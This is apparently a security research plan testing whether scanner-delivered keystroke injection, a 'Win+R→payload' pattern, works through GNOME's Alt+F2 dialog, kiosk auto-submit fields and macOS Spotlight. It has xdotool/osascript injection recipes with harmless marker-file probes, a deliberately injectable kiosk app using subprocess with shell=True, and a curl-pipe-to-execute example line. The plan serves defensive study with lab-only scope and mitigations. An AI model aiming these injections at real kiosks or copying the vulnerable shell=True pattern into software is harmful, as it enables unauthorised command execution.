# W5.3 — Non-Windows target feasibility plan

Branch: `phase/p5-survey` · Deliverable: per-OS recipes replicating the repo's Win+R→payload pattern outside Windows, or documenting the expected negative with runnable proof.

**Scope and authorization.** All tests run on **owned lab VMs** inside the project lab environment (charter: lab-only, owned VMs/hardware). Every recipe below is the VM harness for a *defender-facing* feasibility result: the output is "this entry point exists / does not exist per OS", which feeds the taxonomy paper's Class-K prerequisites (§3: "an execution entry point reachable purely by keystrokes") and the defender mapping (§7). Each recipe states the expected result **before** the commands, so a pass/fail can be pre-registered.

**Hardware vs. software wedge.** The definitive wedge is the P0 replay rig / a real USB HID barcode scanner passed through to the VM (keystroke event log per contract #1). For software-only iteration, `xdotool` (Linux) and `osascript` System Events (macOS) generate synthetic keystrokes and stand in for the wedge; the stand-in is labeled as such in every recipe, and each recipe's *final* validation criterion is a hardware-wedge scan of a printed QR (generated per the `qr-ducky sheet` contract) — hardware-gated items follow merge rule 5 and log expected-but-blocked status when hardware is not present.

## Target 1 — GNOME (Linux): Alt+F2 "Run Command" dialog

**Entry point.** In a GNOME Shell session, Alt+F2 opens a run dialog that executes the entered line as a command through the user's shell. Like Windows' Win+R, it is reachable purely by keystrokes and requires no pointer, no terminal window, and no confirmation for the launching user.

**Expected result: POSITIVE** — a one-line command executes from pure keystroke input, reproducing the Win+R pattern.

### Lab-VM recipe (Debian/Ubuntu GNOME)

1. Provision the lab GNOME VM (owned lab VM, e.g., Debian 12 / Ubuntu 24.04 desktop with GNOME Shell on Wayland or X11).
2. Confirm the run dialog is bound (default binding):
   ```bash
   gsettings get org.gnome.desktop.keybindings status        # e.g. ['<Alt>F2'] on some releases
   # or, where the binding moved:
   gsettings get org.gnome.settings-daemon.plugins.media-keys
   ```
   If Alt+F2 is not bound in the VM's session, bind or use the configured equivalent and record it in the results log.
3. **Software-wedge stand-in test** (wedge cadence approximation: `--delay 8` ms ≈ 125 cps, inside the P1 scanner envelope `min_delay_ms..max_cps`):
   ```bash
   # benign probe payload: launch the calculator
   xdotool key alt+F2; sleep 0.4
   xdotool type --delay 8 'gnome-calculator'
   xdotool key Return
   sleep 2
   pgrep -x gnome-calculator && echo "PASS: arbitrary command executed from run dialog"
   ```
4. **Argument-passing variant** (needed if the payload is a one-liner with arguments):
   ```bash
   xdotool key alt+F2; sleep 0.4
   xdotool type --delay 8 'bash -c "touch /tmp/qrcc-k"'
   xdotool key Return
   sleep 1; test -f /tmp/qrcc-k && echo "PASS: shell line with arguments executed"
   ```
5. **Hardware-wedge final validation** (when the scanner rig is attached): print the QR encoding `bash -c "touch /tmp/qrcc-hw"` + carriage return via the `qr-ducky sheet` contract, USB-passthrough the scanner, focus nothing, press Alt+F2 manually (attacker's hands — this matches the Class-K threat model, taxonomy §3: *the attacker presses the hotkeys*), then scan. 

**Pass criteria:** steps 3/4 pass iff the probe process runs / the marker file exists with no other GUI interaction than the Alt+F2 hotkey; step 5 pass iff the marker exists and the keystroke log (contract #1) shows `source: scanner` events ending in `keydown Return`.

**Fail criteria:** the dialog refuses the string (some GNOME builds restrict the run dialog to launching .desktop-known apps), or the entry requires pointer confirmation. On failure, record the GNOME version and settings, and re-classify Target 1 as negative-with-build-details.

**Defender note (goes in the same results row):** the GNOME-side mitigations are the same family as Class-K controls — HID allowlisting/udev device filtering (GoodUSB lineage, `tian2015goodusb`), automatic screen lock (`org.gnome.desktop.screensaver lock-enabled` + `lock-delay` — ties to W5.2), and removing the binding (`gsettings set ... status []`) on scanner-equipped kiosk carts.

## Target 2 — Kiosk shells: auto-execute scan fields

**Entry point.** Kiosk/POS/self-checkout terminals expose a *focused text field* that auto-submits on the scanner's carriage return. Where that field is an entry/command field (price lookups, item lookups, operator commands), scan input is executed by the consuming application without any GUI confirmation — the scanner is the intended primary input device, so its input is trusted by design.

**Expected result: POSITIVE in the lab replica; real deployments vary** (many kiosk fields are whitelisted lookups — the measured share of hardened vs. raw fields is itself the finding, and the W5.2 kiosk-mode-share metric samples this in the field).

### Lab-VM recipe (minimal kiosk replica)

1. Provision a minimal session VM (Debian minimal + LightDM):
   ```bash
   sudo apt install -y matchbox-window-manager python3-gi lightdm python3-gtk3  # package names per distro release
   ```
2. Autologin kiosk session — create `/var/lib/AccountsService/...` or a dedicated user with `~/.xsession`:
   ```bash
   cat > /home/kiosk/.xsession <<'EOF'
   #!/bin/sh
   matchbox-window-manager &
   exec python3 /opt/kiosk/kiosk.py
   EOF
   ```
3. The replica entry app `/opt/kiosk/kiosk.py` (auto-submit field, representative of POS lookup/command fields):
   ```python
   import subprocess, gi
   gi.require_version("Gtk", "3.0")
   from gi.repository import Gtk
   class K(Gtk.Window):
       def __init__(self):
           super().__init__(title="entry"); self.e = Gtk.Entry(); self.add(self.e)
           self.e.connect("activate", self.on_enter); self.fullscreen(); self.show_all()
       def on_enter(self, *_):
           txt = self.e.get_text(); self.e.set_text("")
           try: out = subprocess.run(txt, shell=True, capture_output=True, timeout=10)
           except Exception as ex: print("err", ex)
   K().connect("destroy", Gtk.main_quit); Gtk.main()
   ```
4. **Wedge test** (software stand-in at scanner cadence):
   ```bash
   sleep 10   # allow the kiosk session to come up and gain focus
   xdotool type --delay 8 'touch /tmp/kiosk-pwned'
   xdotool key Return
   sleep 1; test -f /tmp/kiosk-pwned && echo "PASS: field auto-executed wedge string"
   ```
5. **Hardware-wedge final validation:** print the QR of `touch /tmp/kiosk-pwned\n`, passthrough the scanner, scan with no keyboard/mouse touched.

**Pass criteria:** the marker file exists after a *pure keystroke* sequence with no pointer action and no confirmation dialog — proving the field auto-executes scan input (steps 4 and 5).

**Fail criteria:** the field sanitizes input (only whitelisted commands/lookup codes accepted), or submission requires pointer confirmation. On fail, record the sanitization class — that *is* the defender-control data point.

**Real-appliance note (hardware-gated):** testing retail/medical appliances is hardware-gated per merge rule 5: log expected-but-blocked status in the results row; do not test devices outside the lab authorization.

## Target 3 — macOS: Spotlight path (expected NEGATIVE / LIMITED)

**Entry point claim.** macOS has **no Run-dialog equivalent**: Cmd+Space opens Spotlight, which *indexes applications and documents*; typed text that is not a known item falls through to web-search suggestions. Arbitrary shell strings are not executed from the Spotlight bar.

**Expected result: NEGATIVE for direct execution; LIMITED for a two-step staged path** — and the limitation is the publishable result, documented here as the *reason*:

1. **No command execution from the dialog.** Spotlight launches known/signed items; typing `curl example.host/p|x` triggers a *search*, not a process. There is no Win+R/Alt+F2 analog on stock macOS.
2. **Two-step chain is fragile.** Spotlight *can* launch Terminal.app, after which a second keystroke burst could type into it — but the chain requires focus hand-off timing (spotlight → Terminal), opens a *visible* terminal window (observability, breaks the "blink and you miss it" property), and adds seconds of latency.
3. **TCC privacy prompts interrupt unattended chains** on first use of many resources (e.g., Desktop/Documents/iCloud access from Terminal); the prompt blocks the chain until approved.
4. **Gatekeeper quarantine blocks staged downloads.** The repo's Windows chain downloads and executes a staged script; on stock macOS, downloaded unsigned binaries are quarantined and fail Gatekeeper assessment (notarization required), so the staged-download variant is blocked by default.

### Lab-VM recipe (owned Apple-lab machine/VM)

1. Provision the lab macOS VM (Apple-silicon virtualization on owned hardware per charter; record the macOS version).
2. **Direct-execution negative test** (the *expected* result is non-execution — this is a pre-registered negative):
   ```bash
   # software-wedge stand-in: osascript synthetic keystrokes
   osascript -e 'tell application "System Events" to keystroke space using command down'
   sleep 1
   osascript -e 'tell application "System Events" to keystroke "id -un > /tmp/spotlight-exec"'
   sleep 1
   osascript -e 'tell application "System Events" to keystroke return'
   sleep 2
   test -f /tmp/spotlight-exec && echo "UNEXPECTED: executed" || echo "CONFIRMED NEGATIVE: no execution from Spotlight"
   ps aux | grep -i spotlight-suggestions >/dev/null && echo "input treated as query/suggestion"
   ```
   **Pass criteria (for the negative claim):** `/tmp/spotlight-exec` does **not** exist and no shell process was spawned — non-execution *is the result being confirmed*; the "UNEXPECTED" branch is the failure of the expectation and is recorded as such, not as a test failure.
3. **Two-step chain probe** (documents the LIMITED path and its friction):
   ```bash
   osascript -e 'tell application "System Events" to keystroke space using command down'
   sleep 1
   osascript -e 'tell application "System Events" to keystroke "Terminal"'
   sleep 2
   osascript -e 'tell application "System Events" to keystroke return'
   sleep 4   # focus hand-off latency: Spotlight -> Terminal.app
   osascript -e 'tell application "System Events" to keystroke "touch /tmp/twostep" && return'
   sleep 1; test -f /tmp/twostep && echo "CHAIN WORKS (visible window, focus-timing dependent)"
   ```
   Record: focus hand-off failures across 20 trials (how often the burst lands while Spotlight still holds focus — mistyped into suggestions), visible-window observability, and whether the lab config triggers a TCC prompt during step 4.
4. **Gatekeeper staged-download probe:** attempt the Windows-style staged chain (`curl` a script to `/tmp`, execute) on the stock-config VM; record the quarantine/signature rejection text verbatim as the expected negative for staged variants.
5. **Hardware-wedge final validation:** scanner passthrough on the same three probes; keystroke log per contract #1 with `source: scanner`.

**Fail criteria (expectation-breaking):** if Spotlight *does* execute a typed command on the tested macOS build (e.g., a non-stock launcher replacement bound to Cmd+Space), the negative claim is falsified for that build — record build and launcher, re-classify macOS as positive-with-conditions, and update the taxonomy paper's Class-K prerequisites table.

## Results logging

Each target gets one results row in this file's successor (`papers/nonwindows/results.md`, produced when the runs execute): `target, os_build, wedge(hw|sw-standin), entry_point, verdict(pass|fail|confirmed-negative), evidence, notes`. Verdicts pre-registered by the "Expected result" lines above; any deviation between expectation and outcome is reported, never smoothed. Detection tie-in: Linux verdicts pair with ATT&CK T1674/DET0568 **AN1568** (`/sys/bus/usb/devices/` enumeration + script launch) and macOS with **AN1569** (ioreg enumeration + osascript equivalents) [mitre2025t1674], which the taxonomy paper cites as the Class-K detection surface per platform.
